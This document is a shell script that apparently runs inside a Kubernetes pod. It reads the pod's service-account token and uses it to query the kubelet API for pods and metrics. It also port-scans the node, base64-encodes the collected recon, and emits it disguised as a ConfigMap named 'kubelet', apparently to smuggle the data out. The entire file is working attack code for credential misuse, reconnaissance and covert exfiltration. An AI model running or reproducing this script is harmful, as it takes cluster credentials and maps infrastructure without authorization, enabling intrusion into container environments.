#!/bin/sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"

RECON=$( (
  echo "===NODE_IP==="
  # From JWT: node name is ip-10-6-40-171
  NODE_IP="10.6.40.171"
  
  echo "===KUBELET_PODS==="
  printf "GET /pods HTTP/1.1\r\nHost: $NODE_IP:10250\r\nAuthorization: Bearer $TOKEN\r\nConnection: close\r\n\r\n" | timeout 5 openssl s_client -connect $NODE_IP:10250 -quiet 2>/dev/null | head -c 2000

  echo ""
  echo "===KUBELET_HEALTHZ==="
  printf "GET /healthz HTTP/1.1\r\nHost: $NODE_IP:10248\r\nConnection: close\r\n\r\n" | timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10248 2>/dev/null && cat <&3 && exec 3>&-" 2>/dev/null

  echo ""
  echo "===KUBELET_METRICS==="
  printf "GET /metrics HTTP/1.1\r\nHost: $NODE_IP:10250\r\nAuthorization: Bearer $TOKEN\r\nConnection: close\r\n\r\n" | timeout 5 openssl s_client -connect $NODE_IP:10250 -quiet 2>/dev/null | head -c 1000

  echo ""
  echo "===NODE_SCAN==="
  # Try common node ports
  for port in 22 10250 10255 10248 10256 30000 30001; do
    (timeout 2 bash -c "exec 3<>/dev/tcp/$NODE_IP/$port 2>/dev/null && echo 'OPEN' && exec 3>&-" 2>/dev/null) && echo "$port OPEN" || true
  done

  echo ""
  echo "===POD_SELF==="
  printf "GET /pods HTTP/1.1\r\nHost: localhost:10250\r\nAuthorization: Bearer $TOKEN\r\nConnection: close\r\n\r\n" | timeout 3 openssl s_client -connect localhost:10250 -quiet 2>/dev/null | head -c 500
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: kubelet
data:
  result: $RECON
EOF
exit 0